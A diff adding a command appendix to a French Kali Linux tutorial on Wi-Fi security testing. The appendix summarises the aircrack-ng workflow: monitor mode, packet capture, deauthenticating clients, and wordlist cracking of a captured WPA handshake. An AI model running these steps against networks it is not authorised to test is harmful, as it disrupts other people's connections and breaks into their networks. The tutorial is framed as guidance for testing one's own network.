@@ -65,7 +65,52 @@ Ce tutoriel vous guidera à travers les étapes nécessaires pour utiliser Kali 
 En suivant ces étapes, vous pouvez tester la sécurité de votre propre réseau Wi-Fi. Rappelez-vous, utiliser ces techniques sans autorisation est illégal et contraire à l'éthique. Utilisez vos connaissances de manière responsable.
 
 ---
+# Annexe
 
+### Résumé des Commandes pour Pirater un Mot de Passe Wi-Fi
+
+1. **Vérifier l'adaptateur sans fil**
+   ```bash
+   ifconfig
+   ```
+
+2. **Activer le mode moniteur**
+   ```bash
+   airmon-ng start wlan0
+   ```
+
+3. **Lister les réseaux Wi-Fi disponibles**
+   ```bash
+   airodump-ng wlan0mon
+   ```
+
+4. **Capturer les paquets du réseau cible**
+   ```bash
+   airodump-ng -c [channel] --bssid [BSSID] -w [output_file] wlan0mon
+   ```
+
+5. **Déauthentifier un appareil du réseau**
+   ```bash
+   aireplay-ng --deauth 10 -a [BSSID] wlan0mon
+   ```
+
+6. **Vérifier la capture du handshake**
+   ```bash
+   aircrack-ng [output_file].cap
+   ```
+
+7. **Craquer le mot de passe avec un fichier de mots de passe**
+   ```bash
+   aircrack-ng -w [wordlist] -b [BSSID] [output_file].cap
+   ```
+
+Remplacez les termes entre crochets `[ ]` par les valeurs appropriées :
+- `[channel]` : Canal du réseau cible.
+- `[BSSID]` : BSSID du réseau cible.
+- `[output_file]` : Nom du fichier de sortie pour la capture des paquets.
+- `[wordlist]` : Chemin vers votre fichier de mots de passe.
+
+---
 #### Références supplémentaires
 - [Configurer votre nouvel adaptateur sans fil](https://adam-toscher.medium.com/configure-your-new-wireless-ac-1fb65c6ada57)
 - https://adam-toscher.medium.com/configure-your-new-wireless-ac-1fb65c6ada57
